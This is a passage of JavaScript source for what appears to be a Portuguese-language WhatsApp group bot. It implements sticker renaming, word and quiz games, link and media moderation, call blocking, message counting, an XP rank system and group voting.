function salvarJSON(caminho, dados) {
  fs.writeFileSync(caminho, JSON.stringify(dados, null, 2));
}


//====================≠≠===============\\

const { Sticker } = require("./exports/sticker/rename/sticker.js");

async function renameContextSticker(pack, autor, txt = ``, info) {
  try {
    getfile = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker');
    var _sticker = new Sticker()
    _sticker.addFile(getfile); 
    _sticker.options.metadata = {pack: pack, author: autor, emojis: ['🤠', '🥶', '😻']};
    resultadoSt = await _sticker.start();
    await safeSendMessage(from, {sticker: fs.readFileSync(resultadoSt[0].value), contextInfo: {externalAdReply: {title: txt, body:"", previewType:"PHOTO", thumbnail: fs.readFileSync(resultadoSt[0].value)}}}, {quoted: info})
    await fs.unlinkSync(resultadoSt[0].value)
  } catch(e) {console.log(e)}
}

// ==========[ ANAGRAMA ]==========\\

function convertSticker(base64, author, pack){
 return new Promise((resolve, reject) =>{
axios('https://sticker-api-tpe3wet7da-uc.a.run.app/prepareWebp', {
method: 'POST',
headers: {
Accept: 'application/json, text/plain, */*',
'Content-Type': 'application/json;charset=utf-8',
'User-Agent': 'axios/0.21.1',
'Content-Length': 151330
},
data: `{"image": "${base64}","stickerMetadata":{"author":"${author}","pack":"${pack}","keepScale":true,"removebg":"HQ"},"sessionInfo":{"WA_VERSION":"2.2106.5","PAGE_UA":"WhatsApp/2.2037.6 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36","WA_AUTOMATE_VERSION":"3.6.10 UPDATE AVAILABLE: 3.6.11","BROWSER_VERSION":"HeadlessChrome/88.0.4324.190","OS":"Windows Server 2016","START_TS":1614310326309,"NUM":"6247","LAUNCH_TIME_MS":7934,"PHONE_VERSION":"2.20.205.16"},"config":{"sessionId":"session","headless":true,"qrTimeout":20,"authTimeout":0,"cacheEnabled":false,"useChrome":true,"killProcessOnBrowserClose":true,"throwErrorOnTosBlock":false,"chromiumArgs":["--no-sandbox","--disable-setuid-sandbox","--aggressive-cache-discard","--disable-cache","--disable-application-cache","--disable-offline-load-stale-cache","--disk-cache-size=0"],"executablePath":"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe","skipBrokenMethodsCheck":true,"stickerServerEndpoint":true}}`
}).then(({data}) => {
resolve(data.webpBase64);
}).catch(reject);
});
}
// ==========[ ANAGRAMA ]==========\\

if(isGroup && fs.existsSync(`./banco de dados/grupos/games/anagrama/${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/anagrama/${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return enviar('está perto')
if(budy.toUpperCase() == dataAnagrama.original) { safeSendMessage(from, {text: `🎉 Parabéns *${pushname}*, você acertou o anagrama apresentado.\nA palavra original era: *${dataAnagrama.original}*. Estou iniciando o próximo jogo em 5s!`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./banco de dados/grupos/games/anagrama/${from}.json`)		
		setTimeout(async() => {
fs.writeFileSync(`./banco de dados/grupos/games/anagrama/${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/anagrama/${from}.json`))
safeSendMessage(from, {text:`Decifre a palavra embaralhada abaixo:\n• ${II}Anagrama:${II} ${dataAnagrama2.embaralhada}\n• ${II}Dica:${II} ${dataAnagrama2.dica}`}) 
}, 5000)
}}

if(isGroup && fs.existsSync(`./banco de dados/grupos/games/quiz-animais/${from}.json`)){
let dataAnagramaa = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/quiz-animais/${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagramaa.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagramaa.original) return enviar('está perto')
if(budy.toUpperCase() == dataAnagramaa.original) { 
safeSendMessage(from,{text: `🎉 Parabéns *${pushname}*, você acertou! O animal era: *${dataAnagrama.original}*.\n• Estou iniciando o próximo jogo em 5s!`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./banco de dados/grupos/games/quiz-animais/${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./banco de dados/grupos/games/quiz-animais/${from}.json`, `${JSON.stringify(quizanimais[Math.floor(Math.random() * quizanimais.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/quiz-animais/${from}.json`))
imagemtexto = `🤔 Qual é o animal apresentado na imagem?\n • Envie sua resposta abaixo, mencionando esta mensagem.`
wew = await getBuffer(`${dataAnagrama2.foto}`)   
await safeSendMessage(from, {image: wew, caption: imagemtexto, thumbnail: wew}, {quoted: non})
}, 5000)
}
}

if(isGroup && fs.existsSync(`./banco de dados/grupos/games/gartic/${from}.json`)){
let perg_gartic = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/gartic/${from}.json`))
if(budy.slice(0,4).toUpperCase() == perg_gartic.resposta.slice(0,4).toUpperCase() && budy.toUpperCase() != perg_gartic.resposta) return enviar('Está perto!')
if(budy.toUpperCase() == perg_gartic.resposta) { 
safeSendMessage(from,{text: `*DESCOBERTO!* Parabéns ${pushname}, iniciando o próximo jogo em 5 segundos.`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./banco de dados/grupos/games/gartic/${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./banco de dados/grupos/games/gartic/${from}.json`, `${JSON.stringify(garticArchives[Math.floor(Math.random() * garticArchives.length)])}`)
let dataGartic2 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/gartic/${from}.json`))
garticText = `👩🏼‍🏫 - A resposta é representada por um(a): ${dataGartic2.pergunta}
📜 - A resposta supostamente começa com a(s) letra(s): "${dataGartic2.letra_inicial}"
🤔 - Hmmm, contém traços? ${dataGartic2.contem_traços}
–
❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelargartic* para revelar a resposta correta da afirmação._`
wew = await getBuffer(`${dataGartic2.imagem}`)
await safeSendMessage(from, {image: wew, caption: garticText, thumbnail: wew}, {quoted: non})
}, 5000)
}
}

if(isGroup && fs.existsSync(`./banco de dados/grupos/games/enigma/${from}.json`)){
let enigmaData = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/enigma/${from}.json`))
if(budy.slice(0,4).toUpperCase() == enigmaData.respostaEne.slice(0,4).toUpperCase() && budy.toUpperCase() != enigmaData.respostaEne) return enviar('Está perto!')
if(budy.toUpperCase() == enigmaData.respostaEne) { 
safeSendMessage(from,{text: `*ENIGMA RESOLVIDO!* Parabéns ${pushname}, iniciando o próximo jogo em 5 segundos.`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./banco de dados/grupos/games/enigma/${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./banco de dados/grupos/games/enigma/${from}.json`, `${JSON.stringify(enigmaArchive[Math.floor(Math.random() * enigmaArchive.length)])}`)
let dataEnigmadataEnigma333 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/enigma/${from}.json`))
enigmaTezt = `📜 - Resolva o seguinte enigma abaixo:
–
${dataEnigmadataEnigma333.charada}
–
❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelarenigma* para revelar a resposta correta da enigma._`
wew = await getBuffer(`https://telegra.ph/file/15be608763684b3e3af38.jpg`)
await safeSendMessage(from, {image: wew, caption: enigmaTezt, thumbnail: wew}, {quoted: non})
}, 5000)
}
}

if(isGroup && fs.existsSync(`./banco de dados/grupos/games/wmusic/${from}.json`)){
whatMusic = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/wmusic/${from}.json`))
if(budy.slice(0,4).toUpperCase() == whatMusic.resposta.slice(0,4).toUpperCase() && budy.toUpperCase() != whatMusic.resposta) return enviar('Tá perto hein! Tente novamente...')
if(budy.toUpperCase() == whatMusic.resposta) { 
safeSendMessage(from,{text: `• Resposta Correta: *${whatMusic.resposta}*\nParabéns ${pushname}, iniciando o próximo jogo em 5 segundos.`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./banco de dados/grupos/games/wmusic/${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./banco de dados/grupos/games/wmusic/${from}.json`, `${JSON.stringify(whatMusicAr[Math.floor(Math.random() * whatMusicAr.length)])}`)
wmusic = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/wmusic/${from}.json`))
textM = `🎶🎧 𝐖𝐇𝐀𝐓 𝐌𝐔𝐒𝐈𝐂? 😱💡
–
${wmusic.trechoMusic}
–
🤔😱 Qual música pertence o trecho apresentado acima?
• ${II}Dica:${II} ${wmusic.dica}`
await safeSendMessage(from, {text: textM}, {quoted: non})
}, 5000)
}
}

//=================================\\

function contar(frase, letraProcurada) { 
var total = 0; [...frase].forEach(letra => {
if(letra === letraProcurada) total++; 
}); 
return total; 
}

joguinhodavelha()

var minesId = []
for(let obj of mines) minesId.push(obj.id)
const isPlayMines = (await mines.find(obj => obj.id == from)) ? true : false
var minecor = ['a1', 'a2', 'a3', 'a4', 'a5', 'b1', 'b2', 'b3', 'b4', 'b5', 'c1', 'c2', 'c3', 'c4', 'c5', 'd1', 'd2', 'd3', 'd4', 'd5', 'e1', 'e2', 'e3', 'e4', 'e5']

if(isAntilinkgp && isGroup && isBotGroupAdmins && !isGroupAdmins) {
if(Procurar_String.includes("chat.whatsapp.com/")){
if(isBot) return 
link_dgp = await client.groupInviteCode(from)
if(Procurar_String.match(link_dgp)) return enviar('Link do nosso grupo, não irei remover.. ')  
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
}
}

const groupIdscount = [];
for(let obj of countMessage) {
groupIdscount.push(obj.groupId);
}

// MUTAR USUÁRIO 
const GroupsMutedActived = []
for(let obj of muted) {
    GroupsMutedActived.push(obj.jid)
}
const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
if(isMuted && NumbersMuted.indexOf(sender) >= 0){
setTimeout(async () => {
    safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 1000)
return
}

//====(CONTADOR-DE-MENSAGENS)=======\\
var numbersIds = []
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
var RSM_CN = countMessage[ind].numbers[indnum]
type == "stickerMessage" ? "" : RSM_CN.messages += isCmd ? 0 : 1
type == "stickerMessage" ? "" : RSM_CN.cmd_messages += isCmd ? 1 : 0
type == "stickerMessage" ? "" : RSM_CN.aparelho = adivinha
RSM_CN.figus += type == "stickerMessage" ? 1 : 0
fs.writeFileSync('./dono/media/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = isCmd ? 0 : 1
const cmd_messages = isCmd ? 1 : 0
var figus = type == "stickerMessage" ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages, 
aparelho: adivinha, 
figus: figus
})
fs.writeFileSync('./dono/media/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
figus: 0,
cmd_messages: isCmd ? 1 : 0, 
aparelho: adivinha
}]
})
fs.writeFileSync('./dono/media/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//======================================\\


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return safeSendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: non})
if(dataGp[0].legenda_imagem != "0") {
safeSendMessage(from, {text: dataGp[0].legenda_imagem}, {quoted: non})  
}
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
client.groupParticipantsUpdate(from, [sender], 'remove')
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return safeSendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: non})
safeSendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: non})
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
client.groupParticipantsUpdate(from, [sender], 'remove')
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return safeSendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: non})
if(dataGp[0].legenda_documento != "0") {
safeSendMessage(from, {text: dataGp[0].legenda_documento}, {quoted: non}) 
}
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
client.groupParticipantsUpdate(from, [sender], 'remove')
}

let isTrueFalse = Array('tiktok', 'facebook','instagram','twitter','ytmp3','ytmp4','play', 'playmix', 'play2', 'play3', 'playvid', 'playvid2').some(item => item === command)

if(isUrl(PR_String) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(Procurar_String.includes("chat.whatsapp.com")) {
link_dgp = await client.groupInviteCode(from)
if(Procurar_String.match(link_dgp)) return enviar('Link do nosso grupo, não irei remover.. ') 
}
if(isCmd && isTrueFalse) return
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
client.groupSettingUpdate(from, 'announcement')
setTimeout(() => {
client.groupSettingUpdate(from, 'not_announcement')
}, 1200)
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
}

// ANTI NOTAS FAKES ==================>

if(isAntiNotas && budy2.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.message?.reactionMessage?.text && budy2.length > 20) {
let verificar = budy2.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
if(verificar && budy.length < 100) return  
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
client.groupParticipantsUpdate(from, [sender], 'remove')
}

//FINALZIN ===========================>


//======(ANTI-VIDEO)========\\

if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return safeSendMessage(from,{text: mess.messageProhibitedDetAdmin()}, {quoted: non})
if(dataGp[0].legenda_video == "0") {
safeSendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: non})
} else {
safeSendMessage(from, {text: dataGp[0].legenda_video}, {quoted: non})  
}
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return safeSendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: non})
safeSendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: non})
if(IS_DELETE) {
setTimeout(() => {
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
client.groupParticipantsUpdate(from, [sender], 'remove')
}

//========(ANTI_LIGAR)========\\

if(!isGroup && isAnticall) {
client.ws.on('CB:call', async (B) => {
var msgcallblock = `./banco de dados/func/call-msg_block-${sender}.json`  
if(!fs.existsSync(msgcallblock)) {
fs.writeFileSync(msgcallblock, JSON.stringify(mess.antiCalls(), null, 2))
var msgcallbl = JSON.parse(fs.readFileSync(msgcallblock))
if(B.content[0].tag == 'offer') {
safeSendMessage(B.content[0].attrs['call-creator'], { text: msgcallbl }).then(() => { 
client.updateBlockStatus(B.content[0].attrs['call-creator'], "block")
DLT_FL(msgcallblock)
})
}
}
})
}

//====================================\\

{var hora_ = moment.tz('America/Sao_Paulo').format('HH:mm');
var hora_2 = moment.tz('America/Sao_Paulo').format('mm');
for (i of black_) {
if(i.hora == hora_) {var blu_dc = true} else {var blu_dc = false}
}
if(blu_dc == true) {
for ( i of black_) {
if(i.hora == hora_) var ik = i}
for ( i of ik?.PUXAR) {
if(i.avisou == true) return
if(i.length == 0) return
safeSendMessage(i.idgp, {text: i.msg})
i.avisou = true 
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))
}}; for ( i of black_) {
if(hora_2 >= i.hora.split(":")[1]+parseInt(1)) {
var ik2 = i
var ik_r = true} else {var ik_r = false}
}; if(ik_r == true) { 
for ( i of ik2.PUXAR) {
if(i.avisou == true) {
i.avisou = false
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))}}}}

/* ANTIPV1 - Este anti pv bloqueia aqueles que encaminham mensagem no pv do bot.. */
var USUARIOS_BLOQ = []
if(isAntiPv && !USUARIOS_BLOQ.includes(sender)) {
if(!isGroup && !SoDono && !isPremium){ 
await sleep(2500)
enviar(msgantipv1.replace('#nome#', pushname))
setTimeout(async () => {
client.updateBlockStatus(sender, 'block')
}, 2000)
}
USUARIOS_BLOQ.push(sender);
} 

/* ANTIPV2 - Vai floodar o privado do usuário que encaminhar a mensagem no privado.. */
var MSG_ANTPV2_ENC = []
if(!isGroup && !isPremium && !SoDono && !info.key.fromMe && isAntiPv2 && !MSG_ANTPV2_ENC.includes(sender)) {
MSG_ANTPV2_ENC.push(sender);
return enviar(msgantipv2)
}

/* ANTIPV3 - Ignora todos os que falam ou usam os comandos no privado, exceto user premium e o proprietário atual do bot. */
if(!isGroup && !isPremium && !SoDono && !info.key.fromMe && isAntiPv3) {return}

//====================================\\
var i9 = countMessage.map(i => i.groupId).indexOf(from)
var idgrupo = groupIdscount.indexOf(from)

var idusu = numbersIds?.indexOf(sender)

if(body != undefined && !info.message?.reactionMessage?.text && !JSON.stringify(level2).includes(sender) && isGroup) {
level2.push({id: sender, nick: pushname, level: 1, contador: 0, block: false})
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
}

if(body != undefined && !info.message?.reactionMessage?.text && JSON.stringify(level2).includes(sender) == false && isGroup && isLevelingOn) {
AB = level2.map(i => i.id).indexOf(sender)
level2[AB].contador += 1
level2[AB].nick = pushname
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
switch(level2[AB].contador) {
case 100: case 200: case 300: case 400: case 500: case 600: case 700: case 800: case 900: case 1200: case 1500: case 1800: case 2100: case 2700: case 3300: case 3900: case 4500: case 5000: case 5500: case 6500: case 7500: case 9000: case 10500: case 12000: case 13500: case 15000: case 20000: case 25000: case 30000: case 35000: case 40000: case 50000: case 60000: case 70000: case 80000: case 90000: case 100000: case 150000: case 200000: case 300000: case 400000: case 500000: case 1000000: case 1500000: case 2000000: case 5000000:
var newlevel = level2[AB].contador + 1
if(newlevel < 100) newpatente = "Bronze I"
if(newlevel >= 100 && newlevel < 200) newpatente = "Bronze II"
if(newlevel >= 200 && newlevel < 300) newpatente = "Bronze III"
if(newlevel >= 300 && newlevel < 400) newpatente = "Prata I"
if(newlevel >= 400 && newlevel < 500) newpatente = "Prata II"
if(newlevel >= 500 && newlevel < 600) newpatente = "Prata III"
if(newlevel >= 600 && newlevel < 700) newpatente = "Ouro I"
if(newlevel >= 700 && newlevel < 800) newpatente = "Ouro II"
if(newlevel >= 800 && newlevel < 900) newpatente = "Ouro III"
if(newlevel >= 900 && newlevel < 1200) newpatente = "Ouro IV"
if(newlevel >= 1200 && newlevel < 1500) newpatente = "Platina I"
if(newlevel >= 1500 && newlevel < 1800) newpatente = "Platina II"
if(newlevel >= 1800 && newlevel < 2100) newpatente = "Platina III"
if(newlevel >= 2100 && newlevel < 2700) newpatente = "Platina IV"
if(newlevel >= 2700 && newlevel < 3300) newpatente = "Diamante I"
if(newlevel >= 3300 && newlevel < 3900) newpatente = "Diamante II"
if(newlevel >= 3900 && newlevel < 4500) newpatente = "Diamante III"
if(newlevel >= 4500 && newlevel < 5000) newpatente = "Diamante IV"
if(newlevel >= 5000 && newlevel < 5500) newpatente = "Paladino I"
if(newlevel >= 5500 && newlevel < 6500) newpatente = "Paladino II"
if(newlevel >= 6500 && newlevel < 7500) newpatente = "Paladino III"
if(newlevel >= 7500 && newlevel < 9000) newpatente = "Paladino IV"
if(newlevel >= 9000 && newlevel < 10500) newpatente = "Mestre I"
if(newlevel >= 10500 && newlevel < 12000) newpatente = "Mestre II"
if(newlevel >= 12000 && newlevel < 13500) newpatente = "Mestre III"
if(newlevel >= 13500 && newlevel < 15000) newpatente = "Mestre IV"
if(newlevel >= 15000 && newlevel < 20000) newpatente = "Mestre V"
if(newlevel >= 20000 && newlevel < 25000) newpatente = "Desafiante I"
if(newlevel >= 25000 && newlevel < 30000) newpatente = "Desafiante II"
if(newlevel >= 30000 && newlevel < 35000) newpatente = "Desafiante III"
if(newlevel >= 35000 && newlevel < 40000) newpatente = "Desafiante IV"
if(newlevel >= 40000 && newlevel < 50000) newpatente = "Desafiante V"
if(newlevel >= 50000 && newlevel < 60000) newpatente = "Usuário Superior I"
if(newlevel >= 60000 && newlevel < 70000) newpatente = "Usuário Superior II"
if(newlevel >= 70000 && newlevel < 80000) newpatente = "Mestre Supremo I"
if(newlevel >= 80000 && newlevel < 90000) newpatente = "Mestre Supremo II"
if(newlevel >= 90000 && newlevel < 100000) newpatente = "Mestre Supremo III"
if(newlevel >= 100000 && newlevel < 150000) newpatente = "Conquistador I"
if(newlevel >= 150000 && newlevel < 200000) newpatente = "Conquistador II"
if(newlevel >= 200000 && newlevel < 300000) newpatente = "Conquistador III"
if(newlevel >= 300000 && newlevel < 400000) newpatente = "Desbravador I️"
if(newlevel >= 400000 && newlevel < 500000) newpatente = "Desbravador II️"
if(newlevel >= 500000 && newlevel < 1000000) newpatente = "Desbravador III️"
if(newlevel >= 1000000 && newlevel < 1500000) newpatente = "Grande Mestre I"
if(newlevel >= 1500000 && newlevel < 2000000) newpatente = "Grande Mestre II"
if(newlevel >= 2000000 && newlevel < 5000000) newpatente = "Grande Mestre III"
if(newlevel >= 5000000 && newlevel < 10000000) newpatente = "Supremy"
if(newlevel >= 10000000) newpatente = "Veterano 🎩"
level2[AB].level += 1
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
safeSendMessage(from, {text: `️*🛡️ Missão concluída com sucesso, soldado(a)!*\n\n➤ *Usuário:* @${sender.split("@")[0]}\n➤ *Status:* Nova patente alcançada!\n➤ *Patente:* *${newpatente}️* 💫\n\nContinue ativo(a) no grupo e conquiste ainda mais!`, mentions: [sender]}, {quoted: non})
break
case 10000000:
BC = level2.map(i => i.id).indexOf(sender)
level2[BC].level += 1
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar(`🎉 Parabéns ${pushname}, você completou com sucesso 10M de XP, possuindo assim o título de *Supremy*\n–\n• Todos os níveis daqui pra frente serão contados a cada 1M de XP... Nossa equipe se orgulha de coroar você, depois de tanto esforço e desempenho, após muito tempo de uso de nosso sistemas. ${tempo}!`)
break
case 10000000: case 11000000: case 12000000: case 13000000: case 14000000: case 15000000: case 16000000: case 17000000: case 18000000: case 19000000: case 20000000: case 21000000: case 22000000: case 23000000: case 24000000: case 25000000: case 26000000: case 27000000: case 28000000: case 29000000: case 30000000:
CD = level2.map(i => i.id).indexOf(sender)
level2[CD].level += 1
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
safeSendMessage(from, {text: `*🎉 SUPREME LEVEL UP! 🎖️*\nMeus parabéns querido usuário *${sender.split("@")[0]}*.\n• Sua experiência acaba de levar a quantidade total de XP à triplicar. Agora você tem *${level2[CD].contador} XP*\n–\n*Obs:* Sua patente atual continua sendo a mesma, pois você chegou à maior.`, mentions: [sender]}, {quoted: non})
break
}
}

const VerificarJSON = (json, value) => {
if(JSON.stringify(json).includes(value)) return true
return false
}

const toUpdateDay = JSON.parse(fs.readFileSync("./banco de dados/usuarios/SystemRPG/attday.json"));
const datinhadodia = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')

/////\\\\\\//////\\\\\\////\\\\////\\\///\\\///\\\\

const isVotoDuelo = isGroup ? votacao.includes(from) : false

const AdicionarVoto = async(IDGRUPO, R1, R2, R3, R4, mention) => {
votacao.push(IDGRUPO)
fs.writeFileSync(`./banco de dados/func/votacao/p_votos/${IDGRUPO}.json`, `[]`)
fs.writeFileSync(`./banco de dados/func/votacao/votos/${IDGRUPO}.json`, `[]`)
fs.writeFileSync('./banco de dados/func/votacao/voting.json', JSON.stringify(votacao))
await sleep(2000)
const otos = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/votos/${IDGRUPO}.json`))
otos.push({razao: R1 ? R1 : '-', votos: R2.trim() + '@s.whatsapp.net', votos2: R3.trim() + '@s.whatsapp.net', duracao: R4})
fs.writeFileSync(`./banco de dados/func/votacao/votos/${IDGRUPO}.json`, JSON.stringify(otos))
setTimeout(async function() {
let voto = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/p_votos/${IDGRUPO}.json`))
let verdade = voto.filter(V1 => V1.votacao == '01')
let falso = voto.filter(V2 => V2.votacao == '02')
if(verdade.length == falso.length) return mention(`*😱🗳️ VOTAÇÃO EMPATADA! 🗳️😱*\n• Os 2 usuários terminaram em empate, com a mesma pontuação de votos.\nEntão a decisão está na mão dos adms, se vai refazer a votação, ou decidir o ganhador de alguma forma.\n—\n• [1] Total de Votos do Usuário da Cor Vermelha ( @${otos[0].votos.split('@')[0]} ): *${verdade.length}*\n• [2] Total de Votos do Usuário da Cor Azul ( @${otos[0].votos2.split('@')[0]} ): *${falso.length}*`)
mention(`*❌ VOTAÇÃO ENCERRADA! 🗳️*\n• Soma total de todos os membros que realizaram seus votos: *${verdade.length + falso.length}*\n—\n• Quantidade de Votos que Usuário Vermelho recebeu ( @${otos[0].votos.split('@')[0]} ): *${verdade.length}*\n• Quantidade de Votos que o Usuário Azul recebeu ( @${otos[0].votos2.split('@')[0]} ): *${falso.length}*\n—\n🎉🌟 *@${verdade.length > falso.length ? otos[0].votos.split('@')[0] : otos[0].votos2.split('@')[0]}* acaba de ganhar a votação! Parabéns ao ganhador e aos ambos participantes... Se você não ganhou, não fique com raiva um dia você ganha! Confie em si próprio!`)
fs.unlinkSync(`./banco de dados/func/votacao/votos/${IDGRUPO}.json`) /* Remover.. */
fs.unlinkSync(`./banco de dados/func/votacao/p_votos/${IDGRUPO}.json`) /* Remover.. */
fs.writeFileSync("./banco de dados/func/votacao/voting.json", JSON.stringify(votacao)) /* Modificar.. */
}, R4*60*1000)
}

const DeletarVotos = (IDGRUPO) => {
processo = votacao.indexOf(IDGRUPO)
while(processo >= 0) {
votacao.splice(processo, 1)
processo = votacao.indexOf(IDGRUPO)
}
fs.writeFileSync(`./banco de dados/func/votacao/voting.json`, JSON.stringify(votacao)) /* Adicionar.. */
fs.unlinkSync(`./banco de dados/func/votacao/votos/${IDGRUPO}.json`) /* Remover.. */
fs.unlinkSync(`./banco de dados/func/votacao/p_votos/${IDGRUPO}.json`) /* Remover.. */
}

if(fs.existsSync(`./banco de dados/func/votacao/p_votos/${from}.json`)) {
if (budy2 === '1'){
let voto = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/p_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions(`Olá @${sender.split('@')[0]}, não é possível votar duas vezes.`, filtro, true)
} else {
voto.push({participante: id_voto, votacao: '01'})
fs.writeFileSync(`./banco de dados/func/votacao/p_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `*🗳️ VOTAÇÃO 🌟* - Informações de usuário(s) que participaram:\n—\n*@${_votos[0].votos.split('@')[0]} VS @${_votos[0].votos2.split('@')[0]}*\n• Participante [1] : @${_votos[0].votos.split('@')[0]}\n• Participante [2] : @${_votos[0].votos2.split('@')[0]}\n—\n• Quant. de votos contabilizados: *${voto.length}*\n• Tempo definido pelo admin para o encerramento: *${_votos[0].duracao} min(s).*\n—\n• Voto(s) Contabilizado(s) do(s) Usuário(s):\n——\n`
for(let i = 0; i < voto.length; i++) {
_voto +=  `• O(a) participante *@${voto[i].participante.split('@')[0]}* votou no integrante *(${voto[i].votacao})*.\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
